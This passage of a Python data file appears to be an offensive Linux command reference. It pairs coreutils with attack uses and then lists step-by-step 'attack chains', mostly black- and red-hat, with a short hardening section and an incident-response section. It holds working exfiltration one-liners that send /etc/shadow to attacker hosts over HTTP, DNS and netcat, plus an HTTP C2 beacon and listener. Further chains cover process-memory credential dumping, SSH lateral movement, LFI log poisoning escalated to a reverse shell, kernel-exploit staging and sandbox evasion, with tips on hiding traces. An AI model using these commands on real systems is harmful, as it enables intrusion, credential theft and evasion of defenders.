            "split -n 10 bigfile.txt part_             # split into exactly 10 equal parts",
        ],
        "combinations": [
            {"with": "base64", "example": "split -b 400k /tmp/data.tgz /tmp/.c_; for f in /tmp/.c_*; do base64 $f | curl -s -d @- http://attacker/r; done", "note": "Chunk → encode → HTTP exfil loop — 400KB fits comfortably in most POST body limits"},
            {"with": "dd",     "example": "dd if=/dev/sda | split -b 2G - /mnt/usb/disk_part_",        "note": "Stream disk image directly to split — no intermediate full-size temp file needed"},
        ],
    },
    "unlink": {
        "quick_use": [
            "unlink /tmp/.pipe                         # remove named pipe",
            "unlink /var/run/daemon.pid                # remove PID file (can crash daemon)",
            "unlink /etc/resolv.conf                   # remove DNS config symlink",
        ],
        "combinations": [
            {"with": "ln",     "example": "unlink /tmp/target && ln -sf /etc/shadow /tmp/target",       "note": "Atomic swap for TOCTOU: remove current link, plant symlink in one sequence"},
            {"with": "shred",  "example": "shred -n 3 /tmp/payload.sh; unlink /tmp/payload.sh",        "note": "Overwrite content then remove directory entry — belts and suspenders deletion"},
        ],
    },
    "csplit": {
        "quick_use": [
            "csplit large.log '/ERROR/' '{*}'          # split log at every ERROR line",
            "csplit archive.b64 100 200 300            # split at line numbers",
            "csplit --suffix-format='%04d.txt' file '/^---/' '{*}'  # formatted output names",
        ],
        "combinations": [
            {"with": "base64", "example": "base64 payload.bin > /tmp/encoded.b64; csplit /tmp/encoded.b64 500 1000 1500; for f in xx*; do curl -s -d @$f http://attacker/upload; done", "note": "Encode then chunk encoded output by line count — line-based chunking easier to reassemble"},
            {"with": "grep",   "example": "csplit /var/log/auth.log '/Failed password/' '{*}'; grep -l 'root' xx*", "note": "Split log on event boundaries then grep each segment — fine-grained log analysis"},
        ],
    },
    "od": {
        "quick_use": [
            "od -An -tx1 /bin/ls | head               # hex dump without address",
            "od -c payload.bin | head                  # character dump with escapes",
            "od -An -tu1 /dev/urandom | head -2        # unsigned decimal bytes of random data",
        ],
        "combinations": [
            {"with": "xxd",    "example": "od -An -tx1 /tmp/payload | tr -d ' \\n' | xargs -I{} echo '\\x{}'", "note": "Convert binary to \\x escape format — useful for shellcode in exploit strings"},
            {"with": "grep",   "example": "od -c /bin/suspicious | grep -E '/bin/|/etc/|sh|exec'",    "note": "Search binary for suspicious string references without strings command"},
        ],
    },
    "stdbuf": {
        "quick_use": [
            "stdbuf -oL tail -f /var/log/auth.log | grep --line-buffered 'Failed'  # real-time grep",
            "stdbuf -o0 ./beacon.sh | nc attacker 4444  # unbuffered output over network",
            "stdbuf -oL python3 monitor.py | tee events.log  # line-buffered Python output",
        ],
        "combinations": [
            {"with": "tee",    "example": "stdbuf -oL ./implant | tee /tmp/implant.log | nc attacker 4444", "note": "Unbuffered: log + forward output in real-time — no delayed bursts that trigger anomaly detection"},
            {"with": "nohup",  "example": "nohup stdbuf -oL ./beacon > /dev/null 2>&1 &",              "note": "Persistent + unbuffered: combine for a well-behaved background implant"},
        ],
    },
    "base32": {
        "quick_use": [
            "echo 'payload' | base32                   # encode",
            "echo 'OBXWY===' | base32 -d               # decode",
            "cat /etc/shadow | base32 | tr -d '\\n' | cut -c1-200  # partial encoded exfil",
        ],
        "combinations": [
            {"with": "base64", "example": "echo 'id' | base64 | base32",                               "note": "Double encode: base64 output then base32 — very few IDS signatures cover both layers"},
            {"with": "tr",     "example": "cat payload | base32 | tr 'A-Z2-7' 'a-z2-7'",              "note": "Lowercase base32 — same encoding, different character class, defeats case-sensitive signatures"},
        ],
    },
    "mktemp": {
        "quick_use": [
            "tmpfile=$(mktemp); echo payload > $tmpfile; bash $tmpfile; rm $tmpfile  # use+delete",
            "tmpdir=$(mktemp -d); cp /tmp/tools $tmpdir/; cd $tmpdir  # temp staging dir",
            "mktemp -u /tmp/XXXXXX                     # generate name without creating file (TOCTOU demo)",
        ],
        "combinations": [
            {"with": "shred",  "example": "f=$(mktemp); echo payload > $f; bash $f; shred -zu $f",    "note": "Secure temp workflow: create, use, securely delete — no artifacts"},
            {"with": "ln",     "example": "f=$(mktemp -u /tmp/XXXXXX); ln -sf /etc/shadow $f; cat $f", "note": "TOCTOU demo: -u generates name without creating — plant symlink in the gap before use"},
        ],
    },
    "whoami": {
        "quick_use": [
            "whoami && id && groups                    # full identity check",
            "whoami; hostname; uname -a                # who, where, what — 3-second recon",
            "[ $(whoami) = 'root' ] && echo ROOTED || echo 'need privesc'",
        ],
        "combinations": [
            {"with": "id",     "example": "whoami; id; cat /etc/group | grep $(whoami)",               "note": "Full group membership — docker group = root equivalent, sudo group = escalation path"},
            {"with": "sudo",   "example": "whoami && sudo -l 2>/dev/null",                             "note": "Instant post-exploit check: who am I + what can I sudo"},
        ],
    },
    "hostname": {
        "quick_use": [
            "hostname && hostname -I                   # name + all IPs",
            "hostname -f                               # fully qualified domain name",
            "cat /etc/hosts                            # static hostname map",
        ],
        "combinations": [
            {"with": "uname",  "example": "echo \"Host: $(hostname) | Kernel: $(uname -r) | Arch: $(arch) | User: $(whoami)\"", "note": "Single-line full system fingerprint — paste this into your notes"},
            {"with": "ip / ifconfig","example": "hostname && ip a 2>/dev/null || ifconfig 2>/dev/null | grep inet", "note": "Name + network position: essential for mapping multi-homed hosts"},
        ],
    },
    "arch": {
        "quick_use": [
            "arch                                      # x86_64, i686, aarch64, armv7l...",
            "uname -m                                  # alternative to arch",
            "file /bin/bash                            # ELF 64-bit or 32-bit — confirms arch",
        ],
        "combinations": [
            {"with": "file",   "example": "arch && file /bin/ls /lib/libc.so.6 2>/dev/null",           "note": "Cross-check: arch + ELF headers confirm target architecture for payload selection"},
            {"with": "uname",  "example": "uname -a | tee /tmp/sysinfo.txt; arch >> /tmp/sysinfo.txt; cat /etc/*release >> /tmp/sysinfo.txt", "note": "Build a full system fingerprint file for offline analysis"},
        ],
    },
    "nproc": {
        "quick_use": [
            "nproc                                     # total available processors",
            "nproc --all                               # including offline CPUs",
            "cat /proc/cpuinfo | grep -c processor     # alternative",
        ],
        "combinations": [
            {"with": "hashcat","example": "hashcat -m 1800 hashes.txt wordlist.txt -O --force --status --status-timer=10 --threads=$(nproc)", "note": "Use all CPUs for maximum cracking speed on the compromised machine"},
            {"with": "xargs",  "example": "cat targets.txt | xargs -P$(nproc) -I{} bash -c 'nc -z -w1 {} 22 2>/dev/null && echo \"{} SSH\"'", "note": "Parallel scan with exactly as many threads as CPUs — optimal and avoids oversaturation"},
        ],
    },
    "logname": {
        "quick_use": [
            "logname                                   # real login user (survives su/sudo)",
            "logname; whoami; id                       # all three: real, effective, full",
            "echo \"Login: $(logname) | Effective: $(whoami)\"",
        ],
        "combinations": [
            {"with": "who",    "example": "who | grep $(logname)",                                     "note": "Find your own session in who output — confirms your terminal line for signal sending"},
            {"with": "last",   "example": "last $(logname) | head -5",                                 "note": "Your own login history — useful for cleaning up your traces from last log"},
        ],
    },
    "tty": {
        "quick_use": [
            "tty                                       # /dev/pts/0 (PTY) or 'not a tty' (web shell)",
            "ls -la $(tty)                             # who owns and can write to your terminal",
            "[ -t 1 ] && echo 'interactive' || echo 'non-interactive'",
        ],
        "combinations": [
            {"with": "stty",   "example": "tty && stty size",                                          "note": "Confirm TTY then get dimensions — needed before running curses-based tools"},
            {"with": "python3","example": "tty | grep 'not a tty' && python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "note": "Auto-upgrade: only spawn PTY if not already in one"},
        ],
    },
    "uptime": {
        "quick_use": [
            "uptime                                    # days up + load averages",
            "uptime -p                                 # human readable: 'up 3 days, 2 hours'",
            "cat /proc/uptime                          # raw seconds (machine-readable)",
        ],
        "combinations": [
            {"with": "top",    "example": "uptime; top -b -n1 | head -5",                             "note": "Load snapshot: uptime gives averages, top gives current — compare for spikes"},
            {"with": "who",    "example": "uptime && who",                                             "note": "Low uptime + unknown users = suspicious reboot + re-entry"},
        ],
    },
    "df": {
        "quick_use": [
            "df -h                                     # human-readable disk usage all filesystems",
            "df -h /tmp /var/log /home                 # check specific paths",
            "df -i                                     # inode usage (inode exhaustion ≠ disk full)",
        ],
        "combinations": [
            {"with": "du",     "example": "df -h; echo '---'; du -sh /var/log/* | sort -rh | head",   "note": "Quick: is disk full? If yes, what's using it? Standard sysadmin triage chain"},
            {"with": "find",   "example": "df -h | awk '/[8-9][0-9]%/{print $6}' | xargs find -maxdepth 3 -size +100M 2>/dev/null | head", "note": "Find large files on near-full partitions — data staging for exfil often fills /tmp"},
        ],
    },
    "pinky": {
        "quick_use": [
            "pinky                                     # active sessions (short format)",
            "pinky -l username                         # full info on specific user",
            "pinky | awk '{print $1, $4}'              # user + login time",
        ],
        "combinations": [
            {"with": "who",    "example": "pinky; echo ---; who -a",                                  "note": "Double-check active sessions with two tools — discrepancies can indicate hidden sessions"},
        ],
    },
    "sum": {
        "quick_use": [
            "sum /bin/bash                             # legacy checksum",
            "sum file.tar.gz                           # simple transfer verification",
        ],
        "combinations": [
            {"with": "sha256sum","example": "sum /bin/bash; sha256sum /bin/bash",                     "note": "Compare weak vs strong hash — educational: same file, very different security guarantees"},
        ],
    },
}

# ---------------------------------------------------------------------------
# EXTRA ATTACK CHAINS — added at merge time, beyond the playlist universe
# ---------------------------------------------------------------------------
EXTRA_CHAINS = [
    {
        "name": "DNS Exfiltration",
        "hat": "black",
        "scenario": "All HTTP/TCP is blocked or monitored outbound. DNS port 53 is open. You can encode data into DNS queries and receive it on an attacker-controlled nameserver.",
        "commands": ["base64", "cut", "seq", "nslookup"],
        "steps": [
            {
                "step": "encode the data",
                "action": "Base64-encode and split into DNS-safe 63-char chunks",
                "example": "cat /etc/shadow | base64 -w0 | fold -w 30 | nl -n rz -w3 | awk '{print $1\".\"$2}'",
                "note": "DNS labels max 63 chars. Numbered chunks allow reassembly in order on the receiver side."
            },
            {
                "step": "exfil via nslookup loop",
                "action": "Send each chunk as a subdomain query to your DNS server",
                "example": "cat /etc/shadow | base64 -w0 | fold -w 30 | while read chunk; do nslookup \"${chunk}.attacker.com\" 8.8.8.8 > /dev/null 2>&1; done",
                "note": "Replace attacker.com with a domain you control and 8.8.8.8 with your own DNS server IP."
            },
            {
                "step": "attacker — capture queries",
                "action": "On your DNS server, log all incoming queries",
                "example": "tcpdump -i eth0 -w dns_capture.pcap 'port 53'\n# or: python3 -m dnslib.server -p 53 --log-prefix",
                "note": "Parse the capture: extract the subdomain labels, sort by number prefix, base64-decode to reconstruct the file."
            },
            {
                "step": "reassemble on attacker",
                "action": "Extract subdomains from DNS log and decode",
                "example": "tshark -r dns_capture.pcap -T fields -e dns.qry.name | grep 'attacker.com' | sed 's/.attacker.com//' | sort | cut -d. -f2 | tr -d '\\n' | base64 -d > recovered_shadow",
                "note": "tshark (Wireshark CLI) extracts query names. Adjust the sed pattern to match your domain."
            }
        ]
    },
    {
        "name": "HTTP Beacon / C2 Channel",
        "hat": "black",
        "scenario": "You need a persistent, reconnecting command channel that blends with normal web traffic. Using curl over HTTP to a listener disguised as a web server.",
        "commands": ["curl", "base64", "nohup", "sleep", "echo"],
        "steps": [
            {
                "step": "attacker — set up listener",
                "action": "Run a simple HTTP server that accepts commands and returns output",
                "example": "# Python one-liner listener:\npython3 -c \"\nimport http.server, subprocess, base64\nclass H(http.server.BaseHTTPRequestHandler):\n  def do_GET(self):\n    cmd=base64.b64decode(self.path[1:]).decode()\n    out=subprocess.getoutput(cmd)\n    self.send_response(200); self.end_headers()\n    self.wfile.write(base64.b64encode(out.encode()))\nhttp.server.HTTPServer(('0.0.0.0',8080),H).serve_forever()\n\"",
                "note": "The path encodes the command. Response encodes the output. Blends as HTTP GET requests."
            },
            {
                "step": "victim — beacon loop",
                "action": "Beacon that polls for commands and returns output",
                "example": "nohup bash -c '\nwhile true; do\n  CMD=$(curl -s http://attacker:8080/$(echo whoami | base64 -w0))\n  echo \"$CMD\" | base64 -d | bash > /tmp/.out 2>&1\n  curl -s -X POST --data-binary @/tmp/.out http://attacker:8080/output\n  sleep 30\ndone' &",
                "note": "30-second polling interval. Encode actual commands in the GET path. Output POSTed back."
            },
            {
                "step": "user-agent blending",
                "action": "Make curl traffic look like a legitimate browser",
                "example": "curl -s -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' http://attacker:8080/$(echo id | base64 -w0)",
                "note": "User-agent spoofing makes traffic blend with normal browser activity in proxy logs."
            }
        ]
    },
    {
        "name": "Process Memory Credential Dump",
        "hat": "red",
        "scenario": "You have root. Passwords and secrets live in process memory. You can read them directly from /proc without needing external tools like mimikatz.",
        "commands": ["cat", "grep", "find", "dd", "strings"],
        "steps": [
            {
                "step": "find target process",
                "action": "Identify processes that might hold credentials in memory",
                "example": "ps aux | grep -iE 'sshd|mysql|postgres|redis|nginx|apache|python|ruby'\ncat /proc/[PID]/cmdline | tr '\\0' ' '",
                "note": "Web servers, database clients, and auth daemons are richest targets."
            },
            {
                "step": "read process maps",
                "action": "Find readable memory regions for the target process",
                "example": "cat /proc/[PID]/maps | grep -v 'r--\\|---'",
                "note": "Regions marked r-xp (code) and rw-p (heap/stack/data) contain live runtime data."
            },
            {
                "step": "dd — dump memory region",
                "action": "Dump a specific memory region to file",
                "example": "# From maps output, get start-end address of heap:\ndd if=/proc/[PID]/mem bs=1 skip=$((0xSTART)) count=$((0xEND - 0xSTART)) of=/tmp/memdump.bin 2>/dev/null",
                "note": "Replace START/END with hex addresses from /proc/[PID]/maps. Requires root or ptrace access."
            },
            {
                "step": "strings — extract readable data",
                "action": "Extract human-readable strings from the memory dump",
                "example": "strings /tmp/memdump.bin | grep -iE 'pass|secret|token|key|auth|session' | head -50",
                "note": "strings tool may not be present — substitute: cat /tmp/memdump.bin | tr -cd '[:print:]\\n' | grep -E '.{8,}'"
            },
            {
                "step": "cleanup",
                "action": "Remove the memory dump",
                "example": "shred -zu /tmp/memdump.bin",
                "note": "Memory dumps are large and obvious. Delete immediately after extraction."
            }
        ]
    },
    {
        "name": "Filesystem Recon (Full)",
        "hat": "red",
        "scenario": "First 5 minutes on a new system. Systematic sweep to understand what's running, what data is here, and what paths to escalation exist.",
        "commands": ["find", "cat", "ls", "stat", "du", "grep", "which", "whoami"],
        "steps": [
            {
                "step": "identity + system",
                "action": "Establish identity, OS, kernel, architecture",
                "example": "whoami; id; uname -a; arch; cat /etc/*release 2>/dev/null | head -5",
                "note": "All in one line. kernel version determines kernel exploits. OS version determines package exploits."
            },
            {
                "step": "network position",
                "action": "Map interfaces, routes, and active connections",
                "example": "ip a; ip route; ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null",
                "note": "Multi-homed = pivot point. Listening ports = local services to attack."
            },
            {
                "step": "find valuable files",
                "action": "Locate databases, configs, keys, and backups",
                "example": "find / \\( -name '*.sql' -o -name '*.db' -o -name 'id_rsa' -o -name '.env' -o -name '*.pem' -o -name 'backup*' \\) -readable 2>/dev/null | head -30",
                "note": "This one find command covers the most common high-value file types."
            },
            {
                "step": "installed software",
                "action": "List installed packages and running services",
                "example": "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null | head -30\nsystemctl list-units --type=service --state=running 2>/dev/null | head -20",
                "note": "Outdated packages = known CVEs. Services = attack surface and credential storage."
            },
            {
                "step": "cron and scheduled tasks",
                "action": "Find scripts running as root via cron",
                "example": "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null",
                "note": "World-writable scripts run by root cron = instant privesc."
            },
            {
                "step": "writable root-owned files",
                "action": "Files owned by root but writable by current user",
                "example": "find / -user root -writable -type f 2>/dev/null | grep -v '/proc\\|/sys'",
                "note": "Direct privesc: write to a root-owned script that gets executed by cron or service."
            }
        ]
    },
    {
        "name": "SSH Lateral Movement",
        "hat": "red",
        "scenario": "You have credentials or private keys. You need to move to other machines without triggering alerts. SSH is trusted traffic — blend in.",
        "commands": ["cat", "find", "grep", "ssh", "scp"],
        "steps": [
            {
                "step": "find SSH keys",
                "action": "Locate private keys on the compromised system",
                "example": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null\nfind /home /root -name 'authorized_keys' 2>/dev/null",
                "note": "authorized_keys shows which systems trust this key. id_rsa is the key itself."
            },
            {
                "step": "known_hosts recon",
                "action": "Map which hosts this machine connects to",
                "example": "cat ~/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u",
                "note": "known_hosts is a free network map. Every entry = a host this machine has SSH'd to."
            },
            {
                "step": "bash_history pivot targets",
                "action": "Extract SSH destinations from command history",
                "example": "cat ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null | grep '^ssh' | sort -u",
                "note": "History shows exactly what IP/hostname + username was used previously."
            },
            {
                "step": "ssh — lateral move",
                "action": "Connect to target using found key",
                "example": "ssh -i /home/user/.ssh/id_rsa -o StrictHostKeyChecking=no user@target_ip 'id; hostname'",
                "note": "-o StrictHostKeyChecking=no avoids the interactive 'yes/no' prompt that would block scripted access."
            },
            {
                "step": "scp — move tools or data",
                "action": "Copy files between compromised machines",
                "example": "scp -i ~/.ssh/id_rsa /tmp/linpeas.sh user@target:/tmp/\nscp -i ~/.ssh/id_rsa user@target:/etc/shadow /tmp/shadow_target",
                "note": "SCP traffic looks identical to normal SSH. Preferred over wget/curl if those are monitored."
            }
        ]
    },
    {
        "name": "Password Cracking Prep",
        "hat": "red",
        "scenario": "You extracted hashes from /etc/shadow or a database. Now prepare them for offline cracking with hashcat or john.",
        "commands": ["cat", "cut", "grep", "sort", "base64"],
        "steps": [
            {
                "step": "extract crackable hashes",
                "action": "Pull only users with real hashes (not locked accounts)",
                "example": "grep -v ':!:\\|:\\*:' /etc/shadow | cut -d: -f1,2 | tee /tmp/hashes_raw.txt",
                "note": "! = locked, * = disabled. Only rows with real hash content ($6$, $5$, $y$, etc.) are crackable."
            },
            {
                "step": "identify hash type",
                "action": "Determine the hash algorithm for hashcat -m flag",
                "example": "head -1 /tmp/hashes_raw.txt\n# $6$ = SHA-512 (mode 1800)\n# $5$ = SHA-256 (mode 7400)\n# $y$ = yescrypt (mode 7400)\n# $1$ = MD5 (mode 500)\n# $2y$ = bcrypt (mode 3200)",
                "note": "The prefix in the hash tells you the algorithm. Wrong -m flag = zero results."
            },
            {
                "step": "format for hashcat",
                "action": "Extract just the hash field for hashcat input",
                "example": "cut -d: -f2 /tmp/hashes_raw.txt > /tmp/hashes_only.txt\nwc -l /tmp/hashes_only.txt",
                "note": "hashcat needs just the hash, not user:hash format. john accepts either."
            },
            {
                "step": "transfer hashes out",
                "action": "Exfiltrate the hash file for offline cracking on a GPU machine",
                "example": "cat /tmp/hashes_only.txt | base64 | nc attacker 4444\n# or\nbase64 /tmp/hashes_only.txt | curl -s -d @- http://attacker:8080/hashes",
                "note": "GPU cracking on the target would spike CPU and get detected. Always crack offline."
            },
            {
                "step": "hashcat command",
                "action": "Crack SHA-512 hashes with a wordlist + rules",
                "example": "hashcat -m 1800 hashes_only.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O --force",
                "note": "-r applies mutation rules (adds numbers, symbols) to wordlist entries. best64.rule covers 80% of real passwords."
            }
        ]
    },
    {
        "name": "Permission Hardening Audit",
        "hat": "blue",
        "scenario": "You need to systematically harden a new Linux system. Find and fix the most common misconfigurations before an attacker does.",
        "commands": ["find", "chmod", "stat", "chown", "ls"],
        "steps": [
            {
                "step": "audit SUID/SGID binaries",
                "action": "List all SUID/SGID binaries and compare against expected",
                "example": "find / -perm /6000 -type f 2>/dev/null | sort | tee /tmp/suid_audit.txt\nwc -l /tmp/suid_audit.txt",
                "note": "Typical Ubuntu has ~30-40 SUID binaries. More than 50 is suspicious. Use gtfobins to check each one."
            },
            {
                "step": "remove unnecessary SUID",
                "action": "Strip SUID from binaries that don't need it",
                "example": "# Common safe-to-strip:\nchmod -s /usr/bin/at /usr/bin/wall /usr/bin/write /usr/bin/chfn /usr/bin/chsh 2>/dev/null",
                "note": "Test functionality after stripping — some services break without SUID. Do on test system first."
            },
            {
                "step": "world-writable files",
                "action": "Find and fix world-writable files outside /tmp",
                "example": "find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/tmp/*' -perm -o+w -type f 2>/dev/null | tee /tmp/world_writable.txt\ncat /tmp/world_writable.txt | xargs chmod o-w 2>/dev/null",
                "note": "World-writable files outside /tmp are almost always misconfigurations."
            },
            {
                "step": "sensitive file permissions",
                "action": "Ensure critical files have tight permissions",
                "example": "chmod 640 /etc/shadow 2>/dev/null\nchmod 644 /etc/passwd\nchmod 440 /etc/sudoers\nchmod 700 /root\nstat -c '%a %n' /etc/shadow /etc/passwd /etc/sudoers /root",
                "note": "640 on shadow: root read+write, shadow group read. 440 on sudoers: root and sudo group read-only."
            },
            {
                "step": "no-execute mount check",
                "action": "Ensure /tmp is mounted noexec, nosuid",
                "example": "mount | grep '/tmp'\n# If not noexec, add to /etc/fstab:\n# tmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0\nmount -o remount,noexec,nosuid /tmp",
                "note": "noexec /tmp prevents most dropper payloads. Attackers fall back to /dev/shm — check that too."
            },
            {
                "step": "audit cron write permissions",
                "action": "Check no cron script is world-writable",
                "example": "find /etc/cron* /var/spool/cron -type f -perm -o+w 2>/dev/null\nls -la /etc/crontab /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/",
                "note": "World-writable cron scripts + any cron job running them as root = trivial full compromise."
            }
        ]
    },
    {
        "name": "Incident Response Triage",
        "hat": "blue",
        "scenario": "Someone just called you. A server is acting strange. You have a shell. You have 10 minutes to determine if it's compromised and preserve evidence.",
        "commands": ["who", "top", "find", "stat", "tail", "comm", "sha256sum"],
        "steps": [
            {
                "step": "DO NOT REBOOT — preserve memory",
                "action": "Memory contains active connections, running malware, and encryption keys",
                "example": "# First: document current state without changing anything\ndate; uptime; who; id",
                "note": "Rebooting kills memory artifacts. If ransomware is running, killing it might corrupt partially-encrypted files."
            },
            {
                "step": "active sessions + processes",
                "action": "Who is on the system and what are they running",
                "example": "who -a\nps auxf | grep -v '\\[' | head -40\nss -tulpn 2>/dev/null | grep ESTABLISHED",
                "note": "Focus on: unexpected users, processes with no parent, unusual network connections."
            },
            {
                "step": "recent modifications",
                "action": "What changed in the last 24 hours",
                "example": "find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/run/*' -mtime -1 -type f 2>/dev/null | tee /tmp/ir_recent_changes.txt",
                "note": "Sort by mtime to build a timeline. Pay attention to changes in /bin, /usr/bin, /etc, /var/www."
            },
            {
                "step": "binary integrity check",
                "action": "Verify critical binaries against package manager",
                "example": "# Debian/Ubuntu:\ndpkg --verify 2>/dev/null | grep -v '^$'\n# RHEL/CentOS:\nrpm -Va 2>/dev/null | grep -v '/doc'\n# Manual:\nsha256sum /bin/bash /usr/bin/sudo /bin/ls /usr/bin/ssh 2>/dev/null",
                "note": "Any FAILED or modified hash on a system binary = trojanized binary."
            },
            {
                "step": "hidden files + unusual locations",
                "action": "Hunt for attacker artifacts",
                "example": "find /tmp /var/tmp /dev/shm /run -type f 2>/dev/null\nfind / -name '.*' -not -path '/proc/*' -not -path '*/\\.' -type f 2>/dev/null | grep -v '/home/\\|/.\\.' | head -30",
                "note": "Payloads in /dev/shm are memory-only. /tmp/.hidden files are classic. Look for executable non-package files."
            },
            {
                "step": "preserve evidence before cleanup",
                "action": "Copy logs and artifacts before anything is modified",
                "example": "tar czf /root/ir_evidence_$(date +%Y%m%d_%H%M).tgz /var/log/ /tmp/ /root/ir_recent_changes.txt 2>/dev/null\nsha256sum /root/ir_evidence_*.tgz",
                "note": "Hash the evidence archive immediately — this establishes chain of custody for any legal proceedings."
            }
        ]
    },
    {
        "name": "Log Poisoning → Code Execution",
        "hat": "black",
        "scenario": "You can read Apache/Nginx logs via LFI (Local File Inclusion) but can't write directly. Inject PHP/shell code into the log via a crafted User-Agent, then include the log file.",
        "commands": ["curl", "nc", "cat", "grep"],
        "steps": [
            {
                "step": "confirm LFI exists",
                "action": "Verify you can read server files via the vulnerable parameter",
                "example": "curl 'http://target/page.php?file=../../../etc/passwd'\n# or:\ncurl 'http://target/page.php?file=../../../../var/log/apache2/access.log'",
                "note": "If /etc/passwd renders: LFI confirmed. If access.log renders: log poisoning is viable."
            },
            {
                "step": "inject PHP into log",
                "action": "Send a request with PHP webshell code in the User-Agent",
                "example": "curl -s -A '<?php system($_GET[\"cmd\"]); ?>' http://target/",
                "note": "This writes the PHP code verbatim into the Apache access.log as the User-Agent field."
            },
            {
                "step": "execute via LFI",
                "action": "Include the poisoned log through the LFI — PHP executes",
                "example": "curl 'http://target/page.php?file=../../../../var/log/apache2/access.log&cmd=id'",
                "note": "The PHP interpreter processes the log file, executes your code, and returns the output in the page."
            },
            {
                "step": "escalate to reverse shell",
                "action": "Use RCE to launch a proper reverse shell",
                "example": "# URL-encode the payload:\nENCODED=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/attacker/4444 0>&1'))\")\ncurl \"http://target/page.php?file=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27${ENCODED}%27\"",
                "note": "Start nc -lvnp 4444 first. The payload executes as www-data — start privesc from there."
            }
        ]
    },
    {
        "name": "Bash TCP Port Scanner (No Tools)",
        "hat": "red",
        "scenario": "No nmap, no nc, no masscan — stripped environment. Pure bash + /dev/tcp to scan a network range.",
        "commands": ["seq", "timeout", "bash", "echo"],
        "steps": [
            {
                "step": "single port check",
                "action": "Test if one port is open using bash built-in /dev/tcp",
                "example": "timeout 1 bash -c 'echo > /dev/tcp/192.168.1.1/22' 2>/dev/null && echo 'port 22 open'",
                "note": "/dev/tcp/host/port is a bash built-in pseudo-device. If the connection succeeds, the port is open. No external tools needed."
            },
            {
                "step": "port range scan on one host",
                "action": "Scan common ports on a single target",
                "example": "for port in 21 22 23 25 80 443 445 3306 3389 5432 6379 8080 8443 27017; do\n  timeout 1 bash -c \"echo > /dev/tcp/192.168.1.1/$port\" 2>/dev/null && echo \"$port open\"\ndone",
                "note": "Adjust the port list. Add & after the echo to parallelize — remove sequential bottleneck."
            },
            {
                "step": "seq — host sweep",
                "action": "Ping sweep a /24 without ping (ICMP may be blocked)",
                "example": "seq 1 254 | while read i; do\n  (timeout 1 bash -c \"echo > /dev/tcp/192.168.1.$i/80\" 2>/dev/null && echo \"192.168.1.$i HTTP open\") &\ndone; wait",
                "note": "Checks port 80 as a proxy for host-up. Parallel with & and wait."
            },
            {
                "step": "banner grab",
                "action": "Read service banner from open port",
                "example": "exec 3<>/dev/tcp/192.168.1.1/22; cat <&3 & sleep 1; exec 3>&-",
                "note": "exec opens a file descriptor to the TCP socket. cat reads the banner. Works for SSH, FTP, SMTP, Redis."
            }
        ]
    },
    {
        "name": "Kernel Exploit Preparation",
        "hat": "black",
        "scenario": "Low-privilege shell on an old system. Kernel version suggests a local privilege escalation exploit exists. Prepare the exploit without triggering detection.",
        "commands": ["uname", "arch", "find", "gcc", "which"],
        "steps": [
            {
                "step": "fingerprint the kernel",
                "action": "Get exact kernel version and architecture",
                "example": "uname -r && uname -m && cat /etc/os-release | head -5",
                "note": "Search exploitdb.com or searchsploit for the exact uname -r output. Look for 'local privilege escalation' results."
            },
            {
                "step": "check if gcc is available",
                "action": "Determine if you can compile exploits on the target",
                "example": "which gcc g++ cc 2>/dev/null\ngcc --version 2>/dev/null",
                "note": "If gcc is absent: compile on a matching architecture system offline, transfer the binary."
            },
            {
                "step": "find writable + noexec-free location",
                "action": "Find where you can write and execute the exploit",
                "example": "mount | grep -v noexec | grep -E 'ext4|xfs|btrfs'\nfind / -writable -type d 2>/dev/null | grep -v proc | head -10",
                "note": "noexec mounts block execution. /dev/shm is often exec-allowed and memory-only."
            },
            {
                "step": "transfer exploit",
                "action": "Get the exploit to the target",
                "example": "# If curl available:\ncurl -o /dev/shm/exploit.c http://attacker:8080/exploit.c\n# If only base64:\necho 'BASE64_OF_EXPLOIT_C' | base64 -d > /dev/shm/exploit.c",
                "note": "/dev/shm because it's almost always exec-allowed and disappears on reboot."
            },
            {
                "step": "compile and run",
                "action": "Compile with minimal flags, run the exploit",
                "example": "gcc -o /dev/shm/exp /dev/shm/exploit.c -static 2>/dev/null\nchmod +x /dev/shm/exp\n/dev/shm/exp",
                "note": "-static embeds libc — eliminates library version mismatches between your compile box and target."
            },
            {
                "step": "verify and cleanup",
                "action": "Confirm root, then clean up",
                "example": "whoami && id && cat /etc/shadow | head -3\nshred -zu /dev/shm/exploit.c /dev/shm/exp",
                "note": "Verify with /etc/shadow read — conclusive proof of root. Shred both source and binary."
            }
        ]
    },
    {
        "name": "Timing-Based Sandbox Evasion",
        "hat": "black",
        "scenario": "Your payload is being analyzed by a sandbox. Sandboxes typically time out after 30–120 seconds. Add delays to ensure the payload only runs in real environments.",
        "commands": ["sleep", "timeout", "nice", "stdbuf", "date"],
        "steps": [
            {
                "step": "sleep — basic delay",
                "action": "Sleep longer than the sandbox timeout before executing",
                "example": "sleep 300 && bash -i >& /dev/tcp/attacker/4444 0>&1",
                "note": "Most sandboxes timeout at 60-120s. 300s (5 min) sleep defeats them all. Real endpoints just wait."
            },
            {
                "step": "date — time-of-day check",
                "action": "Only execute during business hours when a human would be at the desk",
                "example": "HOUR=$(date +%H); [ $HOUR -ge 9 ] && [ $HOUR -le 17 ] && bash payload.sh",
                "note": "Sandboxes run 24/7. Employees work 9-5. Time-check defeats automated overnight sandbox runs."
            },
            {
                "step": "environment checks",
                "action": "Check for sandbox artifacts before executing",
                "example": "# Typical sandbox indicators:\n[ $(nproc) -gt 1 ] || exit  # real machines have >1 CPU\n[ $(free -m | awk '/Mem/{print $2}') -gt 1024 ] || exit  # real machines have >1GB RAM\n[ -d /home ] && ls /home | grep -q '.' || exit  # real machines have user home dirs",
